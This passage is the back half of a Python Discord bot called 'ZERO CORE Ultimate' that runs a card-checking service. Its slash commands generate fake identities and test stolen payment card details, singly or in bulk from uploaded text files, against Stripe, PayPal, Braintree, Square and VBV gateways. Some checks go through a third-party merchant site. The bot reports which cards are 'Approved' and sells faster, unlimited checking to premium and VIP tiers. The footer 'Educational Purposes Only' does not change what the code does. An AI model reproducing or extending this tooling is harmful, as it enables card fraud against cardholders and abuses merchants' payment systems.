        await interaction.followup.send(embed=embed, file=file)
    else:
        await interaction.followup.send(embed=embed)

@bot.tree.command(name="address", description="📍 Generate fake address")
@app_commands.describe(country_code="Country code (us, ca, gb, etc.)")
async def address_cmd(interaction: discord.Interaction, country_code: str = "us"):
    """Fake address command"""
    await interaction.response.defer()
    
    address = await fake_address(country_code.lower())
    
    if not address:
        embed = discord.Embed(
            title="Error",
            description="Failed to generate address",
            color=0xff0000
        )
        await interaction.followup.send(embed=embed, ephemeral=True)
        return
    
    flag = get_country_flag(country_code.upper())
    
    embed = discord.Embed(
        title=f"📍 Address For {flag} {address.get('country', country_code.upper())}",
        color=BRAND_COLOR,
        timestamp=datetime.now()
    )
    
    details = f"• **Name:** {address.get('name', 'N/A')}\n"
    details += f"• **Gender:** {address.get('gender', 'N/A')}\n"
    details += f"• **Street Address:** {address.get('street', 'N/A')}\n"
    details += f"• **City/Town/Village:** {address.get('city', 'N/A')}\n"
    details += f"• **State:** {address.get('state', 'N/A')}\n"
    details += f"• **Postal Code:** {address.get('postcode', 'N/A')}\n"
    details += f"• **Country:** {address.get('country', 'N/A')}\n"
    details += f"• **Phone:** {address.get('phone', 'N/A')}"
    
    embed.description = details
    embed.set_footer(text=BRAND_NAME)
    
    await interaction.followup.send(embed=embed)

@bot.tree.command(name="check", description="💳 Check a single card")
@app_commands.describe(
    card="Card in format: number|month|year|cvv",
    gateway="Gateway to use"
)
@app_commands.choices(gateway=[
    app_commands.Choice(name="VBV", value="vbv"),
    app_commands.Choice(name="Stripe", value="stripe"),
    app_commands.Choice(name="Stripe Auth", value="autostripe"),
    app_commands.Choice(name="PayPal", value="paypal"),
    app_commands.Choice(name="Braintree", value="braintree"),
    app_commands.Choice(name="Square", value="square"),
    app_commands.Choice(name="Stripe Charger", value="stripecharger")
])
async def check_cmd(interaction: discord.Interaction, card: str, gateway: str = "autostripe"):
    """Single card check command"""
    # Check registration
    user = bot.db.get_user(interaction.user.id)
    if not user:
        embed = discord.Embed(
            title="Not Registered",
            description="Use `/register` first!",
            color=0xff0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    # Check if banned
    if user['banned']:
        embed = discord.Embed(
            title="Banned",
            description=f"You are banned: {user['ban_reason']}",
            color=0xff0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    await interaction.response.defer()
    
    # Validate card format
    if not re.match(r'\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}', card):
        embed = discord.Embed(
            title="Invalid Format",
            description="Use format: `number|month|year|cvv`\nExample: `4532123456789012|12|2025|123`",
            color=0xff0000
        )
        await interaction.followup.send(embed=embed, ephemeral=True)
        return
    
    start_time = time.time()
    
    # Get BIN info
    bin_number = card.split('|')[0][:6]
    bin_info = await bin_lookup(bin_number)
    
    # Check based on gateway
    gateway = gateway.lower()
    if gateway == "vbv":
        result = await VBVChecker.check(card)
    elif gateway == "stripe":
        result = await StripeChecker.check(card)
    elif gateway == "autostripe":
        checker = StripeAutoChecker("https://epicalarc.com")
        result = await checker.check(card, "https://epicalarc.com")
    elif gateway == "paypal":
        result = await PayPalChecker.check(card)
    elif gateway == "braintree":
        result = await BraintreeChecker.check(card)
    elif gateway == "square":
        result = await SquareChecker.check(card)
    elif gateway == "stripecharger":
        result = await StripeChargerChecker.check(card)
    else:
        embed = discord.Embed(
            title="Invalid Gateway",
            description="Available gateways: vbv, stripe, autostripe, paypal, braintree, square, stripecharger",
            color=0xff0000
        )
        await interaction.followup.send(embed=embed, ephemeral=True)
        return
    
    time_taken = time.time() - start_time
    
    # Update stats
    bot.db.update_check_stats(interaction.user.id, result['success'])
    
    # Create embed
    if result['success']:
        embed = EmbedBuilder.create_approved_embed(
            card, result['gateway'], result['message'], bin_info, time_taken
        )
    else:
        embed = EmbedBuilder.create_declined_embed(
            card, result['gateway'], result['message'], bin_info, time_taken
        )
    
    await interaction.followup.send(embed=embed)

@bot.tree.command(name="masstxt", description="📄 Mass check cards from TXT file (VIP = Unlimited)")
@app_commands.describe(
    gateway="Gateway to use"
)
@app_commands.choices(gateway=[
    app_commands.Choice(name="VBV", value="vbv"),
    app_commands.Choice(name="Stripe", value="stripe"),
    app_commands.Choice(name="Stripe Auth", value="autostripe"),
    app_commands.Choice(name="PayPal", value="paypal"),
    app_commands.Choice(name="Braintree", value="braintree"),
    app_commands.Choice(name="Square", value="square"),
    app_commands.Choice(name="Stripe Charger", value="stripecharger")
])
async def masstxt_cmd(interaction: discord.Interaction, gateway: str = "autostripe"):
    """Mass TXT checking command with unlimited for VIP and faster processing"""
    # Check registration
    user = bot.db.get_user(interaction.user.id)
    if not user:
        embed = discord.Embed(
            title="Not Registered",
            description="Use `/register` first!",
            color=0xff0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    # Check if banned
    if user['banned']:
        embed = discord.Embed(
            title="Banned",
            description=f"You are banned: {user['ban_reason']}",
            color=0xff0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    # Check authorization
    is_admin = bot.db.is_admin(interaction.user.id)
    is_authorized = bot.db.is_authorized(interaction.user.id)
    
    if not is_admin and not is_authorized and user['auth_level'] == 'free':
        embed = discord.Embed(
            title="Premium Feature",
            description="Mass checking requires Premium or VIP access!",
            color=0xff0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    embed = discord.Embed(
        title=f"{BRAND_EMOJI} Mass TXT Checker",
        description="Please upload a TXT file with cards in the next message.\nFormat: `number|month|year|cvv` (one per line)",
        color=BRAND_COLOR
    )
    embed.set_footer(text="You have 60 seconds to upload the file")
    
    await interaction.response.send_message(embed=embed, ephemeral=True)
    
    def check(m):
        return m.author.id == interaction.user.id and m.channel.id == interaction.channel.id and len(m.attachments) > 0
    
    try:
        message = await bot.wait_for('message', timeout=60.0, check=check)
        
        if not message.attachments:
            return
        
        attachment = message.attachments[0]
        
        if not attachment.filename.endswith('.txt'):
            embed = discord.Embed(
                title="Invalid File",
                description="Please upload a .txt file",
                color=0xff0000
            )
            await interaction.followup.send(embed=embed, ephemeral=True)
            return
        
        # Read file
        content = await attachment.read()
        cards = content.decode('utf-8').strip().split('\n')
        cards = [c.strip() for c in cards if c.strip()]
        
        # Limit based on auth level - VIP and ADMIN get UNLIMITED
        if is_admin or user['auth_level'] == 'vip' or (is_authorized and bot.db.get_authorized_level(interaction.user.id) == 'vip'):
            limit = len(cards)  # UNLIMITED for VIP
        elif user['auth_level'] == 'premium' or is_authorized:
            limit = 100
        else:
            limit = 10
        
        cards = cards[:limit]
        
        # Progress message
        progress_embed = discord.Embed(
            title=f"𝗠𝗮𝘀𝘀 {gateway.title()} 𝗖𝗵𝗲𝗰𝗸",
            description=f"𝗟𝗶𝗺𝗶𝘁: 0/{len(cards)}\n\n[✓] Approved: 0 | [✘] Declined: 0 | [⚠] Error: 0\n𝗧/𝘁: 0.00s | Proxy: Live ☁️\n𝗨𝘀𝗲𝗿: {interaction.user.name}",
            color=BRAND_COLOR
        )
        progress_msg = await interaction.followup.send(embed=progress_embed)
        
        approved = 0
        declined = 0
        errors = 0
        start_time = time.time()
        results_text = ""
        
        # Process cards with concurrent checking for faster results
        async def check_single_card(card_data, idx):
            nonlocal approved, declined, errors
            
            # Validate format
            if not re.match(r'\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}', card_data):
                errors += 1
                return f"\n━━━━━━━━━━━━━━━━━━━━━━━━\n𝗖𝗖: {card_data}\n𝗦𝘁𝗮𝘁𝘂𝘀: Error ❌\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: Invalid format\n"
            
            # Get BIN info
            bin_number = card_data.split('|')[0][:6]
            bin_info = await bin_lookup(bin_number)
            
            # Check card based on gateway
            if gateway == "vbv":
                result = await VBVChecker.check(card_data)
            elif gateway == "stripe":
                result = await StripeChecker.check(card_data)
            elif gateway == "autostripe":
                checker = StripeAutoChecker("https://epicalarc.com")
                result = await checker.check(card_data, "https://epicalarc.com")
            elif gateway == "paypal":
                result = await PayPalChecker.check(card_data)
            elif gateway == "braintree":
                result = await BraintreeChecker.check(card_data)
            elif gateway == "square":
                result = await SquareChecker.check(card_data)
            elif gateway == "stripecharger":
                result = await StripeChargerChecker.check(card_data)
            else:
                result = {"success": False, "message": "Invalid gateway"}
            
            # Update counters
            if result['success']:
                approved += 1
                bot.db.update_check_stats(interaction.user.id, True)
                status_emoji = "✅"
                status_text = "Approved"
            else:
                if "error" in result['message'].lower():
                    errors += 1
                    status_emoji = "⚠️"
                    status_text = "Error"
                else:
                    declined += 1
                    bot.db.update_check_stats(interaction.user.id, False)
                    status_emoji = "❌"
                    status_text = "Declined"
            
            # Build info string
            info = f"{bin_info.get('type', '')} - {bin_info.get('level', '')} - {bin_info.get('country_name', '')} {bin_info.get('country_flag', '')}"
            
            # Build result text
            result_line = f"\n━━━━━━━━━━━━━━━━━━━━━━━━\n"
            result_line += f"𝗖𝗖: {card_data}\n"
            result_line += f"𝗦𝘁𝗮𝘁𝘂𝘀: {status_text} {status_emoji}\n"
            result_line += f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {result['message'][:50]}\n"
            result_line += f"𝗜𝗻𝗳𝗼: {info}\n"
            
            return result_line
        
        # Process in batches for faster checking (3 concurrent checks at a time to avoid timeout)
        batch_size = 3
        for i in range(0, len(cards), batch_size):
            batch = cards[i:i+batch_size]
            tasks = [check_single_card(card, idx+i+1) for idx, card in enumerate(batch)]
            batch_results = await asyncio.gather(*tasks)
            
            for result_line in batch_results:
                results_text += result_line
            
            # Update progress (avoid webhook token timeout)
            try:
                current_idx = min(i + batch_size, len(cards))
                elapsed = time.time() - start_time
                progress_embed.description = f"𝗟𝗶𝗺𝗶𝘁: {current_idx}/{len(cards)}\n\n[✓] Approved: {approved} | [✘] Declined: {declined} | [⚠] Error: {errors}\n𝗧/𝘁: {elapsed:.1f}s | Proxy: Live ☁️\n𝗨𝘀𝗲𝗿: {interaction.user.name}"
                progress_embed.description += results_text[-800:]  # Show last results
                
                # Only update every 2 batches to avoid rate limits
                if i % (batch_size * 2) == 0 or current_idx == len(cards):
                    await progress_msg.edit(embed=progress_embed)
            except discord.errors.HTTPException:
                # If webhook expired, send new message
                progress_msg = await interaction.channel.send(embed=progress_embed)
            except Exception as e:
                logger.error(f"Progress update error: {e}")
        
        total_time = time.time() - start_time
        
        # Final results
        final_embed = EmbedBuilder.create_mass_result_embed(
            approved, declined, errors, len(cards), total_time, interaction.user.name
        )
        
        # Save results to file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"mass_check_{timestamp}.txt"
        file_content = f"ZERO CORE Mass Check Results\n"
        file_content += f"User: {interaction.user.name}\n"
        file_content += f"Gateway: {gateway}\n"
        file_content += f"Date: {datetime.now()}\n"
        file_content += f"=" * 50 + "\n\n"
        file_content += results_text
        file_content += f"\n\n{'=' * 50}\n"
        file_content += f"Summary:\n"
        file_content += f"Total: {len(cards)}\n"
        file_content += f"Approved: {approved}\n"
        file_content += f"Declined: {declined}\n"
        file_content += f"Errors: {errors}\n"
        file_content += f"Time: {total_time:.1f}s\n"
        
        file = discord.File(io.BytesIO(file_content.encode()), filename=filename)
        
        try:
            await progress_msg.edit(embed=final_embed)
        except:
            pass
        
        await interaction.channel.send(embed=final_embed, file=file)
        
    except asyncio.TimeoutError:
        embed = discord.Embed(
            title="Timeout",
            description="You didn't upload a file in time",
            color=0xff0000
        )
        await interaction.followup.send(embed=embed, ephemeral=True)
    except Exception as e:
        logger.error(f"Mass check error: {e}")
        embed = discord.Embed(
            title="Error",
            description=f"An error occurred: {str(e)[:100]}",
            color=0xff0000
        )
        try:
            await interaction.followup.send(embed=embed, ephemeral=True)
        except:
            await interaction.channel.send(embed=embed)

@bot.tree.command(name="addadmin", description="👑 Add admin (Owner only)")
@app_commands.describe(user="User to add as admin")
async def addadmin_cmd(interaction: discord.Interaction, user: discord.User):
    """Add admin command"""
    if interaction.user.id != OWNER_ID:
        embed = discord.Embed(
            title="Access Denied",
            description="Only the owner can add admins",
            color=0xff0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    success = bot.db.add_admin(user.id, user.name, interaction.user.id)
    
    if success:
        embed = discord.Embed(
            title="Admin Added",
            description=f"**{user.name}** is now an admin!",
            color=0x00ff00
        )
    else:
        embed = discord.Embed(
            title="Error",
            description="Failed to add admin",
            color=0xff0000
        )
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="removeadmin", description="👑 Remove admin (Owner only)")
@app_commands.describe(user="User to remove as admin")
async def removeadmin_cmd(interaction: discord.Interaction, user: discord.User):
    """Remove admin command"""
    if interaction.user.id != OWNER_ID:
        embed = discord.Embed(
            title="Access Denied",
            description="Only the owner can remove admins",
            color=0xff0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    success = bot.db.remove_admin(user.id)
    
    if success:
        embed = discord.Embed(
            title="Admin Removed",
            description=f"**{user.name}** is no longer an admin",
            color=0x00ff00
        )
    else:
        embed = discord.Embed(
            title="Error",
            description="Failed to remove admin",
            color=0xff0000
        )
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="authorize", description="✅ Grant permanent access (Admin only)")
@app_commands.describe(
    user="User to authorize",
    level="Auth level (premium, vip)"
)
@app_commands.choices(level=[
    app_commands.Choice(name="Premium", value="premium"),
    app_commands.Choice(name="VIP (Unlimited Mass)", value="vip")
])
async def authorize_cmd(interaction: discord.Interaction, user: discord.User, level: str = "premium"):
    """Authorize user command"""
    if not bot.db.is_admin(interaction.user.id):
        embed = discord.Embed(
            title="Access Denied",
            description="Admin only",
            color=0xff0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    if level not in ['premium', 'vip']:
        embed = discord.Embed(
            title="Invalid Level",
            description="Level must be 'premium' or 'vip'",
            color=0xff0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    success = bot.db.authorize_user(user.id, user.name, level, interaction.user.id)
    
    if success:
        embed = discord.Embed(
            title="User Authorized",
            description=f"**{user.name}** now has permanent **{level.upper()}** access!",
            color=0x00ff00
        )
        if level == 'vip':
            embed.add_field(name="Perks", value="✅ Unlimited mass checking\n✅ All gateways access\n✅ Priority support", inline=False)
    else:
        embed = discord.Embed(
            title="Error",
            description="Failed to authorize user",
            color=0xff0000
        )
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="ban", description="🔨 Ban user (Admin only)")
@app_commands.describe(user="User to ban", reason="Ban reason")
async def ban_cmd(interaction: discord.Interaction, user: discord.User, reason: str):
    """Ban user command"""
    if not bot.db.is_admin(interaction.user.id):
        embed = discord.Embed(
            title="Access Denied",
            description="Admin only",
            color=0xff0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    bot.db.ban_user(user.id, reason)
    
    embed = discord.Embed(
        title="User Banned",
        description=f"**{user.name}** has been banned\nReason: {reason}",
        color=0xff0000
    )
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="unban", description="✅ Unban user (Admin only)")
@app_commands.describe(user="User to unban")
async def unban_cmd(interaction: discord.Interaction, user: discord.User):
    """Unban user command"""
    if not bot.db.is_admin(interaction.user.id):
        embed = discord.Embed(
            title="Access Denied",
            description="Admin only",
            color=0xff0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    bot.db.unban_user(user.id)
    
    embed = discord.Embed(
        title="User Unbanned",
        description=f"**{user.name}** has been unbanned",
        color=0x00ff00
    )
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="help", description="📚 View all commands")
async def help_cmd(interaction: discord.Interaction):
    """Help command"""
    embed = discord.Embed(
        title=f"{BRAND_EMOJI} ZERO CORE Ultimate - Command Guide",
        description="Professional all-in-one card services bot with ALL gateways",
        color=BRAND_COLOR,
        timestamp=datetime.now()
    )
    
    embed.add_field(
        name="🔧 General",
        value=(
            "`/register` - Register account\n"
            "`/profile` - View profile\n"
            "`/help` - This guide"
        ),
        inline=False
    )
    
    embed.add_field(
        name="🔍 Tools",
        value=(
            "`/bin <bin>` - BIN lookup\n"
            "`/gen <bin> [count]` - Generate cards\n"
            "`/address [country]` - Fake address"
        ),
        inline=False
    )
    
    embed.add_field(
        name="💳 Checkers",
        value=(
            "`/check <card> [gateway]` - Single check\n"
            "`/masstxt [gateway]` - Mass check from TXT 💎\n"
            "**Gateways:** VBV, Stripe, Stripe Auth, PayPal, Braintree, Square, Stripe Charger"
        ),
        inline=False
    )
    
    embed.add_field(
        name="🔑 Admin Commands",
        value=(
            "`/addadmin <user>` - Add admin (Owner)\n"
            "`/removeadmin <user>` - Remove admin (Owner)\n"
            "`/authorize <user> <level>` - Grant access (Admin)\n"
            "`/ban <user> <reason>` - Ban user (Admin)\n"
            "`/unban <user>` - Unban user (Admin)"
        ),
        inline=False
    )
    
    embed.add_field(
        name="💎 Features",
        value=(
            "✅ Mass TXT checking\n"
            "✅ 7 Premium gateways (VBV, Stripe, PayPal, Braintree, Square, etc.)\n"
            "✅ VIP users get UNLIMITED mass checking\n"
            "✅ FAST concurrent processing (3x speed)\n"
            "✅ Beautiful formatted responses\n"
            "✅ Persistent authorization system\n"
            "✅ Admin management"
        ),
        inline=False
    )
    
    embed.set_footer(text=f"{BRAND_NAME} • Educational Purposes Only • Dev: {DEV_NAME}")
    
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="stats", description="📊 Bot statistics")
async def stats_cmd(interaction: discord.Interaction):
    """Stats command"""
    bot.db.cursor.execute("SELECT COUNT(*) FROM users")
    total_users = bot.db.cursor.fetchone()[0]
    
    bot.db.cursor.execute("SELECT COUNT(*) FROM admins")
    total_admins = bot.db.cursor.fetchone()[0]
    
    bot.db.cursor.execute("SELECT COUNT(*) FROM authorized_users")
    total_authorized = bot.db.cursor.fetchone()[0]
    
    bot.db.cursor.execute("SELECT SUM(total_checks), SUM(successful_checks), SUM(declined_checks) FROM users")
    checks_data = bot.db.cursor.fetchone()
    total_checks = checks_data[0] or 0
    total_success = checks_data[1] or 0
    total_declined = checks_data[2] or 0
    
    embed = discord.Embed(
        title=f"{BRAND_EMOJI} ZERO CORE Statistics",
        color=BRAND_COLOR,
        timestamp=datetime.now()
    )
    
    embed.add_field(name="👥 Users", value=f"`{total_users}`", inline=True)
    embed.add_field(name="👑 Admins", value=f"`{total_admins}`", inline=True)
    embed.add_field(name="✅ Authorized", value=f"`{total_authorized}`", inline=True)
    
    embed.add_field(name="🔢 Total Checks", value=f"`{total_checks}`", inline=True)
    embed.add_field(name="✅ Approved", value=f"`{total_success}`", inline=True)
    embed.add_field(name="❌ Declined", value=f"`{total_declined}`", inline=True)
    
    success_rate = (total_success / total_checks * 100) if total_checks > 0 else 0
    embed.add_field(name="📈 Success Rate", value=f"`{success_rate:.1f}%`", inline=True)
    embed.add_field(name="🌐 Servers", value=f"`{len(bot.guilds)}`", inline=True)
    embed.add_field(name="🎯 Gateways", value="`7 Available`", inline=True)
    
    embed.set_footer(text=f"{BRAND_NAME} • Dev: {DEV_NAME}")
    
    await interaction.response.send_message(embed=embed)

# ==================== ERROR HANDLER ====================

@bot.tree.error
async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    """Error handler with better timeout handling"""
    logger.error(f"Command error: {error}")
    
    if isinstance(error, app_commands.CommandOnCooldown):
        embed = discord.Embed(
            title="Cooldown",
            description=f"Wait {error.retry_after:.0f}s",
            color=0xffa500
        )
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(embed=embed, ephemeral=True)
            else:
                await interaction.followup.send(embed=embed, ephemeral=True)
        except:
            pass
    else:
        embed = discord.Embed(
            title="Error",
            description="An error occurred. Try again later.",
            color=0xff0000
        )
        try:
            if not interaction.response.is_done():
                await interaction.response.send_message(embed=embed, ephemeral=True)
            else:
                await interaction.followup.send(embed=embed, ephemeral=True)
        except:
            pass

# ==================== MAIN ====================

if __name__ == "__main__":
    import sys
    
    print(f"{Fore.CYAN}╔═══════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}║  {BRAND_EMOJI} ZERO CORE Ultimate - Version 6.5 {BRAND_EMOJI}  ║")
    print(f"{Fore.CYAN}║     All-in-One Professional Discord Bot      ║")
    print(f"{Fore.CYAN}║       With ALL Gateways + UNLIMITED VIP      ║")
    print(f"{Fore.CYAN}╚═══════════════════════════════════════════════╝\n")
    
    if len(sys.argv) < 2:
        print(f"{Fore.RED}❌ Bot token required!")
        print(f"{Fore.YELLOW}Usage: python zerocore_discord_bot_fixed.py <BOT_TOKEN>")
        print(f"{Fore.YELLOW}   or: python zerocore_discord_bot_fixed.py\n")
        
        token = input(f"{Fore.GREEN}Enter bot token: {Fore.WHITE}").strip()
        if not token:
            print(f"{Fore.RED}❌ No token provided.")
            sys.exit(1)
    else:
        token = sys.argv[1]
    
    try:
        print(f"{Fore.GREEN}🚀 Starting ZERO CORE Ultimate...\n")
        print(f"{Fore.CYAN}✓ 7 Gateways loaded (VBV, Stripe, Stripe Auth, PayPal, Braintree, Square, Stripe Charger)")
        print(f"{Fore.CYAN}✓ VIP users get UNLIMITED mass checking")
        print(f"{Fore.CYAN}✓ Fast concurrent processing (3x speed)")
        print(f"{Fore.CYAN}✓ Database auto-migration enabled")
        print(f"{Fore.CYAN}✓ Webhook timeout protection active")
        print(f"{Fore.CYAN}✓ Owner ID: {OWNER_ID}\n")
        bot.run(token)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}⚠️  Bot stopped")
    except discord.LoginFailure:
        print(f"{Fore.RED}❌ Invalid token!")
    except Exception as e:
        print(f"{Fore.RED}❌ Error: {e}")
        logger.error(f"Bot error: {e}", exc_info=True)
    finally:
        print(f"{Fore.CYAN}\n{BRAND_EMOJI} ZERO CORE Ultimate offline")
